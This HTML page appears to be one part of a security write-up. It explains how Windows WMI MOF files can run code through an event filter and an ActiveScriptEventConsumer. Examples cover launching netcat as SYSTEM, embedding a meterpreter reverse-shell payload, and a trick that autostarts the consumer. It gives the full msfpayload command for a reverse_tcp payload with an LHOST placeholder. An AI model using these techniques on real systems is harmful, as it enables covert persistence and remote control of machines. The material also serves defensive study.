<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Example Execution</title>
</head><body>Let's see a first basic example of MOF file: let's imagine that we want to launch an executable when some events occur on the system. For illustration purpose, we'll launch the executable (here, Netcat for Windows) when a new log entry is added.<br/>
<br/>
So, we create a correct MOF file with a consumer (instance of ActiveScriptEventConsumer) that executes a VBScript. This VBScript will just create a Shell object and execute netcat with the right parameters. We'll also define an event filter by instantiating the __EventFilter class, in order to define when the consumer will be executed. For the example, we'll notify the consumer from the event filter when a new entry is added in "Application" Logs.<br/>
<br/>
Event filters must use a SQL-like language called WQL (WMI Query Language) to define the Windows event(s) that will spark the execution of the consumer [12].<br/>
<br/>
See child page for the first MOF in use.<br/>
<br/>
<b>MOF Example 1</b><br/>
The example of use with netcat is taken from [15].<br/>
<br/>
Maybe, some explanations are needed:<br/>
Firstly, the event filter defines the WQL query corresponding to the filter. Once again, I've referred to the MSDN to build the query. In WMI, a Windows event is represented using the abstract class __Event, which has many different subclasses. Here we use __InstanceCreationEvent [13].<br/>
<br/>
Secondly, in the consumer we must specify in &nbsp;ScriptingEngine that we want to use VBScript, and then, we just have to pass our script in ScriptText.<br/>
<br/>
Thirdly, we bind the filter and the consumer.<br/>
<br/>
Okay, so in order to check our newly created MOF file, we just put it in the directory %SystemRoot%\System32\wbem\mof\. The instances are added into the repository. And we can confirm that if we add a new log entry - here, coming from a wrong login attempt on MS SQL - the executable nc.exe is started. It runs with SYSTEM privilege, because I'm doing my tests on a Windows 2003 Server SP2:<br/>
<br/>
<b>MOF Example 2</b><br/>
It would be better to put a payload directly in the MOF.<br/>
<br/>
We have already seen that it's possible to put VBscript into an instance of ActiveScriptEventConsumer. So, we can directly put our payload encoded in VBScript ! <br/>
For example, it is possible to use msfencode with the option -t vbs in order to encode a shellcode in VBScript. Let's assume that we want to embed a reverse_tcp meterpreter (fictive example) into a MOF file, we can use the following command:<br/>
<br/>
msfpayload windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; R | msfencode -e generic/none -t vbs<br/>
<br/>
And then, we just need to put the generated VBScript into our MOF file (note that it's necessary to escape all the quotes):<br/>
<br/>
We can actually put any executable into a MOF file thanks to the possibility to use VBScript.<br/>
<br/>
In some circumstances, we might have a problem with the previous MOF files because the consumer isn't automatically started after its registration into the WMI repository. We'll now see a trick that can be used to overcome this.<br/>
<br/>
<b>MOF Example 3</b><br/>
Trigger autostart after MOF file registration<br/>
<br/>
If we dig into the MSDN, we can see that the __InstanceCreationEvent class, that we have used so far in the WQL query, can be actually used to filter on the instantiation of a new class into the WMI repository. The name of the class in question must be given to TargetInstance.__class.<br/>
So, it is possible to use this feature to trigger the autostart of the consumer. Let's see what looks like the new version of our MOF file:<br/>
<br/>
As you can see, I have just added a new class called "WoootClass" at the beginning of the MOF file. This class actually does nothing, but it is instantiated. So after the registration into the WMI repository, this instantiation will automatically trigger the filter, which will in turn trigger the consumer containing our payload !<br/>
<br/>
Therefore, this trick permits to automatically run the consumer. It can be very useful in some situation when we don't want to wait for any Windows event.<br/>
<br/>
<br/>
</body></html>